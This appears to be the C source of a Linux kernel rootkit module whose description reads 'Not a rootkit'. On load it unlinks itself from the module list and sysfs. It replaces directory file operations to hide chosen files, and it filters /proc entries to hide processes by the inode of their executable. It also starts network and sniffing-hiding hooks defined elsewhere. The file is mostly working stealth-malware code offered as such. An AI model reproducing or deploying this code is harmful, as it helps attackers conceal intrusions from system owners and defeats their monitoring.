#include <linux/init.h>
#include <linux/module.h>
#include <linux/path.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/pid.h>
#include <linux/sched/task.h>
#include <linux/kernel.h>
#include <linux/slab.h>

#include "headers/networking.h"
#include "headers/sockets.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yanay Goor");
MODULE_DESCRIPTION("Not a rootkit");
MODULE_VERSION("0.1.0");

static struct list_head *modules;

static char *test_path_name = "/home/yanayg/test_file";
static char *test_path_name2 = "/home/yanayg/test_file2";
static unsigned long proc_ino = 0;

static void hide_module(void) {
    // Save the list for later so we can add the module back in.
	modules = THIS_MODULE->list.prev;
	// Hide from procfs (lsmod)
	// TODO: This means that rmmod will not work, I need to provide a way for the module to unload itself.
	list_del(&THIS_MODULE->list);
	// Hide from sysfs (/sys/module)
	// kobject_del removes the kobject from the sysfs but does
	// not free it's memory (that only happens one the refcount is 0).
	// So it is save to call without causing an error later on when unloading the module.
	 kobject_del(&THIS_MODULE->mkobj.kobj);
	// ???
	// THIS_MODULE->sect_attrs = NULL;
	// ???
	// THIS_MODULE->notes_attrs = NULL;
}

static int is_digits(const char *name, int namelen) {
    int i;
    for (i = 0; i < namelen; i++) {
        if (name[i] - '0' > 9 || name[i] - '0' < 0) return 0;
    }
    return 1;
}


static unsigned long atoui(const char *name, int namelen) {
    int i;
    unsigned int res = 0;
    for (i = 0; i < namelen; i++) {
        if (name[i] - '0' > 9 || name[i] - '0' < 0) return 0;
        res *= 10;
        res += name[i] - '0';
    }
    return res;
}

static void unhide_module(void) {
	// Unhide from procfs (lsmod)
	list_add(&THIS_MODULE->list, modules);
}

static int get_inode_by_path_name(const char *path_name, struct inode **inode) {
    struct path path;
    int retval;
    if ((retval = kern_path(path_name, LOOKUP_FOLLOW, &path))) {
        return retval;
    }
    *inode = path.dentry->d_inode;
    printk(KERN_INFO "Path name: %s, inode: %lu\n", path_name, (*inode)->i_ino);
    path_put(&path);
    return 0;
}

struct fops_hook {
    struct list_head head;
    unsigned long ino;
    struct file_operations *fops;
    struct file_operations *prev_fops;
    unsigned int refcount;
};

static LIST_HEAD(fops_hooks);

static int create_fops_hook(struct inode *inode, struct file_operations **file_operations) {
	struct fops_hook *fops_hook;

	*file_operations = (struct file_operations *)kmalloc(sizeof(struct file_operations), GFP_KERNEL);
	memcpy(*file_operations, inode->i_fop, sizeof(struct file_operations));

	fops_hook = (struct fops_hook *)kmalloc(sizeof(struct fops_hook), GFP_KERNEL);
	fops_hook->ino = inode->i_ino;
	fops_hook->fops = *file_operations;
	fops_hook->prev_fops = inode->i_fop;
    fops_hook->refcount = 1;
	list_add(&fops_hook->head, &fops_hooks);

	inode->i_fop = *file_operations;
	return 0;

}

static int free_fops_hook(struct inode *inode) {
    struct fops_hook *entry;
    unsigned int refcount;

	list_for_each_entry(entry, &fops_hooks, head) {
	    if (entry->ino == inode->i_ino) {
            refcount = --(entry->refcount);
            if (refcount) return 0;
	        kfree(inode->i_fop);
	    	inode->i_fop = entry->prev_fops;
	        list_del(&entry->head);
	        kfree(entry);
	        return 0;
	    }
	}
	return -1;
}

static struct fops_hook *get_fops_hook(const struct inode *inode) {
    struct fops_hook *entry;
	list_for_each_entry(entry, &fops_hooks, head) {
	    if (entry->ino == inode->i_ino) {
	        return entry;
	    }
	}
	return NULL;
}

struct hidden_file_entry {
    struct list_head head;
    // parent directory inode number
    unsigned long ino;
    // file name
    char *file_name;
};

static LIST_HEAD(hidden_files);

static int create_hidden_file_entry(const struct inode *inode, const char *file_name) {
	char *inner_file_name;
	struct hidden_file_entry *hidden_file;

	inner_file_name = (char *)kmalloc(sizeof(char) + strlen(file_name), GFP_KERNEL);
	strcpy(inner_file_name, file_name);

	hidden_file = (struct hidden_file_entry *)kmalloc(sizeof(struct hidden_file_entry), GFP_KERNEL);
	hidden_file->ino = inode->i_ino;
	hidden_file->file_name = inner_file_name;

	list_add(&hidden_file->head, &hidden_files);
	return 0;
}

static int free_hidden_file_entry(const struct inode *inode, const char *file_name) {
    struct hidden_file_entry *entry;

	list_for_each_entry(entry, &hidden_files, head) {
	    if (entry->ino == inode->i_ino && !strcmp(entry->file_name, file_name)) {
	        kfree(entry->file_name);
	        list_del(&entry->head);
	        kfree(entry);
	        return 0;
	    }
	}
	return -1;
}

struct hidden_process_entry {
    struct list_head head;
    unsigned long exe_file_ino;
};

static LIST_HEAD(hidden_processes);

static int create_hidden_process_entry(const char *exe_file_name) {
    int retval;
    struct inode *inode;
	struct hidden_process_entry *hidden_process;

    if ((retval = get_inode_by_path_name(exe_file_name, &inode))) {
	    return retval;
	}

	hidden_process = (struct hidden_process_entry *)kmalloc(sizeof(struct hidden_process_entry), GFP_KERNEL);
	hidden_process->exe_file_ino = inode->i_ino;

	list_add(&hidden_process->head, &hidden_processes);
	return 0;
}

static int free_hidden_process_entry(const char *exe_file_name) {
    int retval;
    struct inode *inode;
    struct hidden_process_entry *entry;

    if ((retval = get_inode_by_path_name(exe_file_name, &inode))) {
	    return retval;
	}

	list_for_each_entry(entry, &hidden_processes, head) {
	    if (entry->exe_file_ino == inode->i_ino) {
	        list_del(&entry->head);
	        kfree(entry);
	        return 0;
	    }
	}
	return -1;
}


static unsigned long get_exec_ino_by_pid(int pid) {
    struct pid *pid_struct;
    struct task_struct *task_struct;
    unsigned long result;

    pid_struct = find_get_pid(pid);
    task_struct = get_pid_task(pid_struct,  PIDTYPE_PID);

    if (!task_struct->mm || !task_struct->mm->exe_file) {
        return 0;
    }

    result = task_struct->mm->exe_file->f_inode->i_ino;
    put_task_struct(task_struct);
    put_pid(pid_struct);
    return result;
}


struct hooked_dir_context {
    struct list_head head;
    struct dir_context *ctx;
    filldir_t prev_actor;
    unsigned long ino;
};

static LIST_HEAD(hooked_dir_context_list);


static int new_actor(struct dir_context *ctx, const char *name, int namelen, loff_t off, u64 ino, unsigned type) {
    struct hooked_dir_context *entry;
    struct hidden_file_entry *hidden_file;
    struct hidden_process_entry *hidden_proc;

	list_for_each_entry(entry, &hooked_dir_context_list, head) {
	    if (entry->ctx == ctx) {
	        list_for_each_entry(hidden_file, &hidden_files, head) {
                if (hidden_file->ino == entry->ino && !strcmp(name, hidden_file->file_name)) {
                    return 0;
                }
	        }
	        if (entry->ino == proc_ino) {
	            list_for_each_entry(hidden_proc, &hidden_processes, head) {
                    if (is_digits(name, namelen) && hidden_proc->exe_file_ino == get_exec_ino_by_pid(atoui(name, namelen))) {
                        return 0;
                    }
                }
	        }
	        return entry->prev_actor(ctx, name, namelen, off, ino, type);
	    }
	}
	return -1;
}

static int new_iterate_shared(struct file *filp, struct dir_context *dir_context) {
    struct hooked_dir_context *hook;
    struct fops_hook *fops_hook;
	printk(KERN_INFO "Called hooked iterate!");
	hook = (struct hooked_dir_context *)kmalloc(sizeof(struct hooked_dir_context), GFP_KERNEL);
	hook->ctx = dir_context;
	hook->prev_actor = dir_context->actor;
	hook->ino = filp->f_inode->i_ino;
	list_add(&hook->head, &hooked_dir_context_list);
	dir_context->actor = new_actor;
	fops_hook = get_fops_hook(filp->f_inode);
	if (fops_hook == NULL) return -1;
	return fops_hook->prev_fops->iterate_shared(filp, dir_context);
}

static char *rsplit(char *str, const char delim) {
    char *occurrence = strrchr(str, delim);
    if (occurrence == NULL) return NULL;
    *occurrence = '\0';
    return occurrence + 1;
}

int hide_file(const char *path_name) {
    int retval;
	char *dir_path;
	char *file_name;
	struct inode *inode;
	struct fops_hook *fops_hook;
	struct file_operations *file_operations;

	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
	strcpy(dir_path, path_name);
    file_name = rsplit(dir_path, '/');

	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
	    return retval;
	}

	if ((retval = create_hidden_file_entry(inode, file_name))) {
	    return retval;
	}
	kfree(dir_path);

	fops_hook = get_fops_hook(inode);
	if (fops_hook != NULL) {
	    fops_hook->refcount++;
	    fops_hook->fops->iterate_shared = new_iterate_shared;
	    return 0;
	}

	if ((retval = create_fops_hook(inode, &file_operations))) {
	    free_hidden_file_entry(inode, file_name);
	    return retval;
	}

	file_operations->iterate_shared = new_iterate_shared;

	return 0;
}

int hide_process(const char *exec_file_path) {
    return create_hidden_process_entry(exec_file_path);
}

int unhide_process(const char *exec_file_path) {
    return free_hidden_process_entry(exec_file_path);
}

static int init_hidden_processes(void) {
    int retval;
	struct inode *inode;
	struct fops_hook *fops_hook;
	struct file_operations *file_operations;

	if ((retval = get_inode_by_path_name("/proc", &inode))) {
	    return retval;
	}

	proc_ino = inode->i_ino;

	fops_hook = get_fops_hook(inode);
	if (fops_hook != NULL) {
	    fops_hook->refcount++;
	    fops_hook->fops->iterate_shared = new_iterate_shared;
	    return 0;
	}

	if ((retval = create_fops_hook(inode, &file_operations))) {
	    return retval;
	}

	file_operations->iterate_shared = new_iterate_shared;

	return 0;
}

int unhide_file(const char *path_name) {
    int retval;
	char *dir_path;
	char *file_name;
	struct inode *inode;

	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
	strcpy(dir_path, path_name);
    file_name = rsplit(dir_path, '/');

	if ((retval = get_inode_by_path_name(dir_path, &inode))) {
	    return retval;
	}

    if ((retval = free_hidden_file_entry(inode, file_name))) {
	    return retval;
	}
    kfree(dir_path);

	return free_fops_hook(inode);
}

void MRK_exit(void) {
	sniff_hiding_exit();
    MRK_exit_nethook();
    unhide_module();
}

static int __init MRK_initialize(void) {
	int err;

	hide_module();
	if ((err = MRK_init_nethook())) return err;
	if ((err = sniff_hiding_init())) return err;
	if ((err = init_hidden_processes())) return err;
    init_hidden_processes();
	return 0;
}


module_init(MRK_initialize);
module_exit(MRK_exit);
